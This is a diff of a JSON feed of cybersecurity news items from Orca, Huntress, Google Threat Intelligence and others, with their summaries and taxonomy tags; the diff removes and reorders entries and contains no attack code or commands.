@@ -10446,60 +10428,6 @@
       }
     },
     {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Zero Breach vs. Zero Impact: Key Takeaways From Cloud Security LIVE 2026",
-      "link": "https://orca.security/resources/webinar-recap/zero-breach-vs-zero-impact-cloud-security-live-2026/",
-      "published": "2026-08-27T17:59:21+00:00",
-      "summary": "Most security programs still measure success by counting blocked attacks. At Cloud Security LIVE 2026, Ariel Parnes, Co-Founder at Mitiga, and Roee, field CTO at Orca, made the case for a different metric entirely. Prevention will never reach zero probability, and both of them were comfortable saying so out loud. What decides the outcome, once […]",
-      "author": "The Orca Security Team",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Vulnerability Prioritization: Modern Methods & Tools",
-      "link": "https://orca.security/resources/blog/vulnerability-prioritization/",
-      "published": "2026-08-27T17:56:20+00:00",
-      "summary": "Key Takeaways Vulnerability prioritization is the decision procedure a security team uses to order remediation work when the finding backlog exceeds the capacity available to clear it. The output is a sequence of work, not a score. Remediation capacity holds roughly steady across a quarter, and the finding count does not. NIST states the consequence […]",
-      "author": "The Orca Security Team",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "vulnerability_disclosure",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Dark Reading",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -10820,35 +10748,6 @@
         "urgency_signals": [],
         "content_type": "low_signal",
         "confidence_tier": "tier_3_analysis",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "The ECB Wants Your AI Cyber Action Plan by 31 October. Here’s How to Build One.",
-      "link": "https://orca.security/resources/blog/ecb-ai-cybersecurity-action-plan/",
-      "published": "2026-08-27T14:05:46+00:00",
-      "summary": "Introduction On 7 July 2026, Claudia Buch, Chair of the ECB’s Supervisory Board, sent a letter to the CEO of every significant institution under ECB Banking Supervision. Its subject was AI-enabled cybersecurity threats, and its message was unusually direct. Assess the impact of the changing threat landscape without delay, build a comprehensive action plan with […]",
-      "author": "The Orca Security Team",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -13428,60 +13327,6 @@
       }
     },
     {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Sensitive Data Discovery: Tools, Best Practices & How It Works",
-      "link": "https://orca.security/resources/blog/sensitive-data-discovery/",
-      "published": "2026-08-24T17:24:26+00:00",
-      "summary": "Key Takeaways Sensitive data discovery finds where regulated, confidential, and personal data sits across an estate, then records each location so a security team can act on it. It runs against object storage, managed databases, snapshots, backups, and analytics warehouses. The practice exists because a hand-drawn map of where data lives falls out of date […]",
-      "author": "The Orca Security Team",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "AI Data Classification: Methods, Tools & Best Practices",
-      "link": "https://orca.security/resources/cloud-security-learning/ai-data-classification/",
-      "published": "2026-08-24T17:00:31+00:00",
-      "summary": "Key Takeaways AI data classification uses machine learning to decide what a data store holds and to attach a label such as personal data, health information, or credentials. The output is a probability that the content matches a type, not a yes or no match. A regular expression fires or it does not. A classifier […]",
-      "author": "The Orca Security Team",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Simon Willison",
       "cohort": "ai_security_agentic_risk",
       "category": "ai_security_agentic_risk",
@@ -14613,35 +14458,6 @@
       }
     },
     {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "BOD 26-04 Just Changed How Federal Agencies Prioritize Vulnerabilities.",
-      "link": "https://orca.security/resources/blog/bod-26-04-just-changed-how-federal-agencies-prioritize-vulnerabilities/",
-      "published": "2026-08-20T18:44:46+00:00",
-      "summary": "Introduction Three days. That’s how long federal agencies now have to patch their riskiest vulnerabilities, and for the first time, a high CVSS score alone won’t land a vulnerability in that bucket. On June 10, 2026, CISA issued Binding Operational Directive (BOD) 26-04, “Prioritizing Security Updates Based on Risk.” It replaces two long-standing directives, BOD […]",
-      "author": "Jake Kramber",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "AWS Security Blog",
       "cohort": "cloud_identity_infrastructure",
       "category": "cloud_identity_infrastructure",
@@ -14665,42 +14481,6 @@
         "content_type": "low_signal",
         "confidence_tier": "tier_2_operator",
         "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Critical Elementor Pro File Upload Flaw Enables Unauthenticated Remote Code Execution on WordPress Sites",
-      "link": "https://orca.security/resources/blog/elementor-pro-wordpress-rce-flaw/",
-      "published": "2026-08-20T18:19:47+00:00",
-      "summary": "Executive Summary A critical vulnerability (CVE-2026-32475, CVSS 9.0) was disclosed affecting the Elementor Pro WordPress plugin, allowing attackers to upload arbitrary PHP files and achieve remote code execution via the Forms module’s File Upload handling. Due to the potential for full server compromise, immediate patching is required. About CVE-2026-32475 The issue originates from the Forms […]",
-      "author": "The Orca Research Pod",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "WordPress"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-32475"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "preauth_unauth",
-          "critical_cvss"
-        ],
-        "content_type": "news_report",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {
-          "WordPress": "target"
-        },
         "weak_tags": {
           "products": []
         }
@@ -21602,6 +21382,35 @@
       }
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "Mac Malware Drains Crypto Wallets Via Fake CAPTCHA Scam",
+      "link": "https://www.huntress.com/blog/mac-crypto-draining-malware",
+      "published": "2026-08-06T14:00:00+00:00",
+      "summary": "A ClickFix scam tricked a Mac user into running a Terminal command that installed Go-based malware able to steal Keychain passwords and drain crypto wallets.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -21630,35 +21439,6 @@
         "urgency_signals": [],
         "content_type": "incident_report",
         "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Huntress",
-      "cohort": "detection_response_operations",
-      "category": "detection_response_operations",
-      "title": "Mac Malware Drains Crypto Wallets Via Fake CAPTCHA Scam",
-      "link": "https://www.huntress.com/blog/mac-crypto-draining-malware",
-      "published": "2026-08-06T14:00:00+00:00",
-      "summary": "A ClickFix scam tricked a Mac user into running a Terminal command that installed Go-based malware able to steal Keychain passwords and drain crypto wallets.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_2_operator",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -23966,6 +23746,33 @@
       }
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "$250M ARR Was Never the Goal. It Came From Staying True to Our Mission.",
+      "link": "https://www.huntress.com/blog/business-reflection-250m-arr",
+      "published": "2026-07-30T14:00:00+00:00",
+      "summary": "Hitting $250M ARR is a milestone, but it wasn't the goal. CEO Kyle Hanslovan reflects on Huntress' mission to protect the 99% and why staying true to it remains his top priority.\"",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -23997,33 +23804,6 @@
         "role_map": {
           "SolarWinds": "target"
         },
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Huntress",
-      "cohort": "detection_response_operations",
-      "category": "detection_response_operations",
-      "title": "$250M ARR Was Never the Goal. It Came From Staying True to Our Mission.",
-      "link": "https://www.huntress.com/blog/business-reflection-250m-arr",
-      "published": "2026-07-30T14:00:00+00:00",
-      "summary": "Hitting $250M ARR is a milestone, but it wasn't the goal. CEO Kyle Hanslovan reflects on Huntress' mission to protect the 99% and why staying true to it remains his top priority.\"",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
         "weak_tags": {
           "products": []
         }
@@ -25288,6 +25068,33 @@
       }
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "CMMC Updates: DoW Pause and Huntress Hits 50% of Requirements",
+      "link": "https://www.huntress.com/blog/huntress-managed-ispm-cmmc-compliance",
+      "published": "2026-07-24T14:00:00+00:00",
+      "summary": "DoW paused the CMMC Phase II deadline in July, but the underlying compliance obligations didn't move. Meanwhile, Huntress Managed ISPM pushes our NIST SP 800-171 coverage to 55 of 110 requirements. Here's what changed, what didn't, and why we're not slowing down.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -25310,33 +25117,6 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Huntress",
-      "cohort": "detection_response_operations",
-      "category": "detection_response_operations",
-      "title": "CMMC Updates: DoW Pause and Huntress Hits 50% of Requirements",
-      "link": "https://www.huntress.com/blog/huntress-managed-ispm-cmmc-compliance",
-      "published": "2026-07-24T14:00:00+00:00",
-      "summary": "DoW paused the CMMC Phase II deadline in July, but the underlying compliance obligations didn't move. Meanwhile, Huntress Managed ISPM pushes our NIST SP 800-171 coverage to 55 of 110 requirements. Here's what changed, what didn't, and why we're not slowing down.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -27082,33 +26862,6 @@
       }
     },
     {
-      "source": "Google Cloud Threat Intelligence",
-      "cohort": "threat_research_primary",
-      "category": "threat_research_primary",
-      "title": "Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management",
-      "link": "https://cloud.google.com/blog/topics/threat-intelligence/ai-assisted-vulnerability-management/",
-      "published": "2026-07-16T14:00:00+00:00",
-      "summary": "Written by: Jules Czarniak Introduction As highlighted in the Mandiant M-Trends 2026 report , the mean time-to-exploit (TTE) has dropped to -7 days, meaning vulnerabilities are often exploited a week before a patch even exists. To keep pace, many security teams are exploring how to integrate large language model (LLM) agents into their codebases, development environments and continuous integration and continuous delivery (CI/CD) pipelines for automated vulnerability discovery and remediation. However, deploying privileged artificial intelligence (AI) agents without mature integration processes introduces new architectural risks. In response to customer inquiries about how to safely integrate AI capabilities into vulnerability management workflows, this blog provides actionable guidance from Mandiant Consulting about how to establish operational guardrails for AI assisted vulnerability management, including several detailed scenarios. What each of these examples show is that security te",
-      "author": "Mandiant",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "vulnerability_disclosure",
-        "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Huntress",
       "cohort": "detection_response_operations",
       "category": "detection_response_operations",
@@ -27158,6 +26911,33 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Google Cloud Threat Intelligence",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management",
+      "link": "https://cloud.google.com/blog/topics/threat-intelligence/ai-assisted-vulnerability-management/",
+      "published": "2026-07-16T14:00:00+00:00",
+      "summary": "Written by: Jules Czarniak Introduction As highlighted in the Mandiant M-Trends 2026 report , the mean time-to-exploit (TTE) has dropped to -7 days, meaning vulnerabilities are often exploited a week before a patch even exists. To keep pace, many security teams are exploring how to integrate large language model (LLM) agents into their codebases, development environments and continuous integration and continuous delivery (CI/CD) pipelines for automated vulnerability discovery and remediation. However, deploying privileged artificial intelligence (AI) agents without mature integration processes introduces new architectural risks. In response to customer inquiries about how to safely integrate AI capabilities into vulnerability management workflows, this blog provides actionable guidance from Mandiant Consulting about how to establish operational guardrails for AI assisted vulnerability management, including several detailed scenarios. What each of these examples show is that security te",
+      "author": "Mandiant",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "vulnerability_disclosure",
+        "confidence_tier": "tier_1_primary_research",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -27340,6 +27120,33 @@
       }
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "Wishin’ for Switchin’? The Huntress Buyout Program Has You Covered",
+      "link": "https://www.huntress.com/blog/ready-to-switch-the-huntress-buyout-program-has-you-covered",
+      "published": "2026-07-15T14:00:00+00:00",
+      "summary": "Stuck riding out a contract with a vendor you no longer want to use? The Huntress Buyout Program covers your remaining term so you can switch today, not later.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -27371,33 +27178,6 @@
               0.28
             ]
           ]
-        }
-      }
-    },
-    {
-      "source": "Huntress",
-      "cohort": "detection_response_operations",
-      "category": "detection_response_operations",
-      "title": "Wishin’ for Switchin’? The Huntress Buyout Program Has You Covered",
-      "link": "https://www.huntress.com/blog/ready-to-switch-the-huntress-buyout-program-has-you-covered",
-      "published": "2026-07-15T14:00:00+00:00",
-      "summary": "Stuck riding out a contract with a vendor you no longer want to use? The Huntress Buyout Program covers your remaining term so you can switch today, not later.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
         }
       }
     },
@@ -30505,33 +30285,6 @@
       }
     },
     {
-      "source": "Google Cloud Threat Intelligence",
-      "cohort": "threat_research_primary",
-      "category": "threat_research_primary",
-      "title": "The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem",
-      "link": "https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-influence-ecosystem/",
-      "published": "2026-06-29T14:00:00+00:00",
-      "summary": "Written by: James Sadowski, Alden Wahlstrom Introduction Four years into Russia’s full-scale invasion of Ukraine, the pro-Russia influence ecosystem has evolved from a tool of war back into a global strategic asset. Since the mobilization of this ecosystem to support frontline objectives, we have witnessed the expedited development of new influence assets linked to multiple, expansive, covert information operations (IO) campaigns and a revitalization of pro-Russia hacktivism at an unprecedented scale. While this threat activity initially adapted to encompass Ukraine-related priorities, it is gradually pivoting back to established Russian influence objectives for which the ecosystem was originally honed. This shift is significant because it likely signals increased focus outside of Ukraine, warning that pro-Russia influence activity targeting the European Union (EU), North Atlantic Treaty Organization (NATO), and other top targeting priorities may intensify. Ultimately, the war in Ukrai",
-      "author": "Google Threat Intelligence Group",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Huntress",
       "cohort": "detection_response_operations",
       "category": "detection_response_operations",
@@ -30557,6 +30310,33 @@
         "role_map": {
           "Microsoft 365": "target"
         },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Google Cloud Threat Intelligence",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem",
+      "link": "https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-influence-ecosystem/",
+      "published": "2026-06-29T14:00:00+00:00",
+      "summary": "Written by: James Sadowski, Alden Wahlstrom Introduction Four years into Russia’s full-scale invasion of Ukraine, the pro-Russia influence ecosystem has evolved from a tool of war back into a global strategic asset. Since the mobilization of this ecosystem to support frontline objectives, we have witnessed the expedited development of new influence assets linked to multiple, expansive, covert information operations (IO) campaigns and a revitalization of pro-Russia hacktivism at an unprecedented scale. While this threat activity initially adapted to encompass Ukraine-related priorities, it is gradually pivoting back to established Russian influence objectives for which the ecosystem was originally honed. This shift is significant because it likely signals increased focus outside of Ukraine, warning that pro-Russia influence activity targeting the European Union (EU), North Atlantic Treaty Organization (NATO), and other top targeting priorities may intensify. Ultimately, the war in Ukrai",
+      "author": "Google Threat Intelligence Group",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_1_primary_research",
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
@@ -31046,6 +30826,35 @@
       }
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "How to Spot a Client in the DoD Industrial Base That Handles CUI",
+      "link": "https://www.huntress.com/blog/how-to-identify-dod-cui-clients",
+      "published": "2026-06-25T14:00:00+00:00",
+      "summary": "Learn how MSPs/MSSPs can identify if a client is a DoD contractor handling CUI.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -31071,35 +30880,6 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Huntress",
-      "cohort": "detection_response_operations",
-      "category": "detection_response_operations",
-      "title": "How to Spot a Client in the DoD Industrial Base That Handles CUI",
-      "link": "https://www.huntress.com/blog/how-to-identify-dod-cui-clients",
-      "published": "2026-06-25T14:00:00+00:00",
-      "summary": "Learn how MSPs/MSSPs can identify if a client is a DoD contractor handling CUI.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "manufacturing_industrial"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -33158,37 +32938,6 @@
       }
     },
     {
-      "source": "Google Cloud Threat Intelligence",
-      "cohort": "threat_research_primary",
-      "category": "threat_research_primary",
-      "title": "Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research",
-      "link": "https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/",
-      "published": "2026-06-15T14:00:00+00:00",
-      "summary": "Written by: Patrick Whitsell, John McGuiness, Muhammad Umair Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research. GTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our ",
-      "author": "Google Threat Intelligence Group",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [
-          "UNC6508"
-        ],
-        "affected_industries": [
-          "healthcare"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Huntress",
       "cohort": "detection_response_operations",
       "category": "detection_response_operations",
@@ -33213,6 +32962,37 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Google Cloud Threat Intelligence",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research",
+      "link": "https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/",
+      "published": "2026-06-15T14:00:00+00:00",
+      "summary": "Written by: Patrick Whitsell, John McGuiness, Muhammad Umair Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research. GTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our ",
+      "author": "Google Threat Intelligence Group",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [
+          "UNC6508"
+        ],
+        "affected_industries": [
+          "healthcare"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_1_primary_research",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -34767,6 +34547,33 @@
       }
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "Why Huntress Doesn’t Need FedRAMP",
+      "link": "https://www.huntress.com/blog/fedramp-alternative-for-defense-contractors",
+      "published": "2026-06-05T14:00:00+00:00",
+      "summary": "Defense contractors can achieve CMMC compliance without the expense or delays of FedRAMP-authorized cloud services. Discover how Huntress uses Sensitive Data Mode for logical separation and cost-effective security.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -34797,33 +34604,6 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Huntress",
-      "cohort": "detection_response_operations",
-      "category": "detection_response_operations",
-      "title": "Why Huntress Doesn’t Need FedRAMP",
-      "link": "https://www.huntress.com/blog/fedramp-alternative-for-defense-contractors",
-      "published": "2026-06-05T14:00:00+00:00",
-      "summary": "Defense contractors can achieve CMMC compliance without the expense or delays of FedRAMP-authorized cloud services. Discover how Huntress uses Sensitive Data Mode for logical separation and cost-effective security.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -39374,33 +39154,6 @@
       }
     },
     {
-      "source": "Wiz Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Build Fast, Build Secure: Wiz findings are now in Lovable",
